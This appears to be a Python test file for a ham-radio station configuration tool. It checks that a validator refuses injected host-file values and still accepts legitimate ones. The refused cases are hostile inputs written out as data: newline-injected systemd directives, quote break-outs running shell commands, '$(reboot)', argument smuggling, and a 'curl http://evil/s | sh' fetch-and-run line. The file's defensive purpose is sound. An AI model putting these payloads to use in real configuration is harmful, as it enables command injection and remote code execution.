"""Host-file values can't break out of what they render into (modules plan M0b).

Review 2026-10-21 (Grok): host-file strings land on command lines. A Linux
unit's ExecStart is one space-joined line, the hub's --mycall/--tnc are raw
words, wait_audio quotes the sound card names inside sh -c '...', and install
prints launchd labels into commands meant for pasting. Every attack it named
must be refused by render.validate, and every real host file must still pass.

    python3 tests/hostfile_safety_test.py
"""
import contextlib
import copy
import io
import json
import shlex
import sys
import os as _os
# Host files come from examples/hosts/ (or a scratch copy) only, never a
# real ~/.config/ranch-radio/hosts on the machine running the tests.
_os.environ["RANCH_RADIO_HOSTS"] = ""
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from ranch_radio import cli, render  # noqa: E402
from ranch_radio import cli as _cli  # noqa: E402
_cli.HOSTS = ROOT / "examples/hosts"            # the examples stand in for a host's files
from ranch_radio.render import Artifact, HostError, sd_word, validate  # noqa: E402

fails = 0


def check(name, got, want):
    global fails
    ok = got == want
    fails += not ok
    print(f"{'ok  ' if ok else 'FAIL'} {name}" + ("" if ok else f"\n     got:  {got!r}\n     want: {want!r}"))


def host(name):
    return json.loads((ROOT / "examples/hosts" / f"{name}.json").read_text())


def refused(name, h, mutate):
    h = copy.deepcopy(h)
    mutate(h)
    try:
        validate(h)
        check(f"refused: {name}", "accepted", "refused")
    except HostError as e:
        check(f"refused: {name}", "refused", "refused")
        return str(e)


for f in sorted((ROOT / "examples/hosts").glob("[!._]*.json")):
    try:
        validate(json.loads(f.read_text()))
        check(f"{f.stem}: today's host file passes", True, True)
    except HostError as e:
        check(f"{f.stem}: today's host file passes", str(e), True)

station_h, mac = host("linux-station"), host("mac-shack")


def setp(path, v):
    def m(h):
        d = h
        for k in path[:-1]:
            d = d[k]
        d[path[-1]] = v
    return m


# The attacks from the review.
refused("ardop_logs with a newline (a second unit directive)", station_h,
        setp(("winlink", "ardop_logs"), "/tmp/x\nExecStart=/bin/sh -c 'touch /tmp/pwned'\n#"))
refused("mycall 'N0CALL --tx' (an extra hub argument)", station_h, setp(("packet", "mycall"), "N0CALL --tx"))
refused("tnc with a space", station_h, setp(("packet", "tnc"), "bt:00:11:22:33:44:55 --http-bind 0.0.0.0"))
refused("allow_calls with junk", station_h, setp(("packet", "allow_calls"), ["N9ABC", "x;y"]))
refused("packet tx as a string", station_h, setp(("packet", "tx"), "yes"))
refused("lane as a string", station_h, lambda h: h["radios"][0].update(lane="4537 --evil"))
refused("lane out of range", station_h, lambda h: h["radios"][0].update(lane=70000))
refused("audio_in with a quote (inside sh -c '...')", station_h,
        lambda h: h["radios"][0].update(audio_in="x' ; touch /tmp/pwned ; '"))
refused("device as an option", station_h, lambda h: h["radios"][0].update(device="--help"))
refused("mesh port as an option", station_h, setp(("mesh", "port"), "--mesh-python=/tmp/evil"))
refused("mesh python with a space", station_h, setp(("mesh", "python"), "/usr/bin/python3 -c x"))
refused("radio id with a slash (a unit name)", station_h, lambda h: h["radios"][0].update(id="../g90"))
refused("ardopcf label with ';' (pasted into a shell)", mac,
        setp(("winlink", "ardopcf", "label"), "x; curl http://evil/s | sh"))
refused("ardopcf bin with a space", mac, setp(("winlink", "ardopcf", "bin"), "/bin/sh -c evil"))
refused("radio label with '$(' ", mac, lambda h: h["radios"][0].update(label="a$(reboot)"))
refused("widget label with a space", mac, setp(("integrations", "macos-widget", "label"), "a b"))
refused("pat with a space (shlex.split, then run)", mac, setp(("winlink", "pat"), "pat --evil"))
refused("an add-on name with a dot", mac, lambda h: h["addons"].update({"x.y": {}}))
refused("add-on enabled as a string", mac, lambda h: h["addons"]["opengd77"].update(enabled="true"))
refused("a NUL anywhere, even in a note", mac, setp(("note",), "a\x00b"))
refused("a newline in an add-on's option", mac, lambda h: h["addons"]["opengd77"].update(label="a\nb"))
refused("tx_timeout as text", mac, lambda h: h["radios"][0].update(tx_timeout="60"))
refused("a percent (a systemd specifier)", station_h, setp(("winlink", "ardop_logs"), "%h/../../etc"))

# Things that must stay allowed.
for name, h, m in (
        ("Mac ardopcf sound card with spaces (one plist argument)", mac,
         setp(("winlink", "ardopcf", "audio_in"), "USB Audio CODEC")),
        ("callsign with SSID", station_h, setp(("packet", "mycall"), "N9ABC-10")),
        ("mesh port list of serial and ble", station_h, setp(("mesh", "port"), "/dev/meshtastic,ble:NODEA_fd78")),
        ("codec table", station_h, lambda h: h["radios"][0].update(codec_db="default=-32,40m=-32"))):
    h = copy.deepcopy(h)
    m(h)
    try:
        validate(h)
        check(f"allowed: {name}", True, True)
    except HostError as e:
        check(f"allowed: {name}", str(e), True)

# sd_word: safe words are untouched (units unchanged); anything else stays one word.
check("sd_word leaves a path alone", sd_word("%h/ranch-radio/server.py"), "%h/ranch-radio/server.py")
check("sd_word leaves a pipewire pair alone", sd_word("pipewire:a.b-c,d.e"), "pipewire:a.b-c,d.e")
check("sd_word quotes a space", sd_word("a b"), '"a b"')
check("sd_word escapes quotes, $ and %", sd_word('a"$%'), '"a\\"$$%%"')

# Printed commands quote what they name (a backstop behind validate).
mac_h = render.load(ROOT / "examples/hosts" / "mac-shack.json")
art = Artifact("winlink", "Library/LaunchAgents/x;y.plist", "plist", {"Label": "x; reboot"})
lines = cli.reload_commands(mac_h, [art])
check("reload line quotes a label", lines[0], "launchctl bootout gui/$(id -u)/" + shlex.quote("x; reboot"))
check("  and the plist path", lines[1].endswith(shlex.quote("Library/LaunchAgents/x;y.plist")), True)

# The CLI's --set takes only the template's own fields.
out = io.StringIO()
with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
    try:
        cli.main(["add", "uvpro", "--host", "linux-laptop", "--set", "python=/tmp/evil"])
        rc = 0
    except SystemExit as e:
        rc, msg = 1, str(e.code)
check("--set a key the template lacks is refused", (rc, "has no field 'python'" in msg), (1, True))

print(f"\n{'all passed' if not fails else f'{fails} FAILED'}")
sys.exit(1 if fails else 0)
